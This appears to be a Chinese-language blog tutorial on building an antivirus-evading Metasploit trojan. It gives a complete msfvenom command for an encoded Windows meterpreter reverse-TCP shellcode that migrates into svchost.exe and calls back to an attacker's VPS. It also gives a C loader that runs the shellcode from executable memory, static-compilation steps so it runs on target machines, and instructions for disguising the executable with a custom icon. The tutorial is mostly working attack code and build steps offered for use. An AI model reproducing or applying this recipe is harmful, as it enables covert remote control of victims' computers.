**目录**

[MSF木马的免杀](#t0)

[C/C++加载免杀](#t1)

[加图标](#t2)

* * *

MSF木马的免杀
--------

MSF下输入下列命令，生成[免杀](https://so.csdn.net/so/search?q=%E5%85%8D%E6%9D%80&spm=1001.2101.3001.7020)shellcode

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=x.x.x.x LPORT=8888 -e x86/shikata_ga_nai -i 15 -b '\x00\' PrependMigrate=true PrependMigrateProc=svchost.exe -f c > shellcode.c
```


这里的 payload 选择 windows/meterpreter/reverse\_tcp，LHOST和LPORT分别填VPS的地址和MSF监听的端口，-e x86/shikata\_ga\_nai -i 15 是用 x86/shikata\_ga\_nai 编码 15 次(建议编码12次以上)，而 PrependMigrate=true  PrependMigrateProc=svchost.exe 使这个程序默认会迁移到 svchost.exe 进程。

![](https://img-blog.csdnimg.cn/20200525145925850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

会生成 shellcode.c 文件，打开该文件如图所示：

![](https://img-blog.csdnimg.cn/20191216155618214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### C/C++加载免杀

然后在VS中新建一个C++项目，我这里在VS2012中新建一个c++的win32项目，然后将下面的代码复制进去，再将shellcode.c里面的那些复制到shellcode的位置。

```
#include<stdio.h>      
#include<windows.h>       
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")      
unsigned char shellcode[]= 这里填shellcode;      
void main(){      
     LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);      
     memcpy(Memory, shellcode, sizeof(shellcode));      
    ((void(*)())Memory)();      1
}
```


如下，点击生成解决方案，之后会生成一个exe程序

![](https://img-blog.csdnimg.cn/20191216164644822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

生成的exe程序即是免杀之后的[木马](https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020)程序。还可以进行其他伪装，比如修改图标，修改程序名等。

![](https://img-blog.csdnimg.cn/20191216164803636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果直接把该程序拿到win7或server2008之类的虚拟机去执行，可能会提示缺少dll文件。这是因为我们在编译程序的过程中是使用的动态编译，如果目标机器不存在相关的dll文件就会报此错误。

![](https://img-blog.csdnimg.cn/20200525150315195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

解决办法就是我们在编译程序的时候，选择静态编译的方法。静态编译就是在编译可执行文件的时候，将可执行文件需要调用的对应动态链接库(.dll)中的部分提取出来，链接到可执行文件中去，使可执行文件在运行的时候不依赖动态链接库。但是这样使用静态编译的方法可能会导致编译出来的程序会偏大。

静态编译，需要如下配置：

*   右键项目 -> 属性 -> 配置属性 -> 高级 -> MFC的使用：在静态库中使用MFC
*   右键项目 -> 属性 -> C/C++ -> 代码生成 -> 运行库：选择 多线程（/MT）
*   编译时选择Debug  x86

![](https://img-blog.csdnimg.cn/20200526123945611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)![](https://img-blog.csdnimg.cn/20200526124036246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200526125151947.png)

然后重新 生成——>重新生成解决方案 进行编译。然后在目标机器运行，我们就可以收到弹回的session了。

![](https://img-blog.csdnimg.cn/20200525222806260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 加图标

如果想对木马加图标的话，右键项目——>添加——>资源

![](https://img-blog.csdnimg.cn/20200526004435329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后选择icon

![](https://img-blog.csdnimg.cn/20200526004137189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这样就会在程序目录下生成一个icon1.ico文件，我们用自己的ico图标将该文件替换。

![](https://img-blog.csdnimg.cn/20200526004240420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200526004351752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

重新编译，生成的exe程序就是我们指定的图标了。

![](https://img-blog.csdnimg.cn/20200526004510219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

注：貌似现在这种免杀方法也会被查杀了